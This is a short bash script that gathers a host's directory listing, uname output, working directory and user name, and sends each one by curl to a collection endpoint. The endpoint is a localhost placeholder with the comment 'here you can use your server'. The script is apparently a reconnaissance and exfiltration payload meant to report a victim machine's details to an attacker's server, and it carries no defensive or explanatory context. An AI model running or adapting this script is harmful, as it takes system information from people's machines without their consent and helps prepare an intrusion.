#!/bin/bash
OUTPUT1=$(ls | paste -sd ":")
OUTPUT2=$(uname -a |sed 's/ //g')
OUTPUT3=$(pwd)
OUTPUT4=$(whoami)
var1= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT1) //here you can use your server
var2= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT2)
var3= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT3)
var4= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT4)
